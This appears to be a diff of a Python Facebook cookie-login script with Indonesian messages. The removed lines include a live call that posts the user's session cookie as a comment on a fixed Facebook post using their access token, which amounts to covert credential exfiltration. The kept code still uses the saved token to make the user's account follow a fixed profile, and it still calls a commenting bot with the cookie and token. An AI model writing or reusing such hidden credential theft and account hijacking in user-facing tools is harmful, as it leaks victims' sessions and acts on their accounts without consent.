@@ -926,13 +926,8 @@ def logincoki():
 					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
 					open('.fantoken.txt','w').write(token)
 					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
-					#requests.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={token}')
-					#requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cok})
-					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={token}", headers={"cookie": cok})
 					bot_komen(cok, token)
-					
-					#Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
-				else:Console().print(f" {H2}• {P2}[bold red]Cookie Invalid");exit()
+				else:Console().print(f" {H2}• {P2}[bold red]Cookie Invalid, Ganti cookie anda!!");exit()
 			except Exception as e:print(e);exit()
 		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
 		sleep(2);exit()
@@ -950,7 +945,7 @@ def bot_komen(cok, ken):
 # ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
 def bot_follow():
 	with requests.Session() as r:
-		toket = open('.fantokeneaag.txt','r').read()
+		toket = open('.fantoken.txt','r').read()
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
 # ----------------[ BAGIAN-MENU ]----------------#
 def menu():
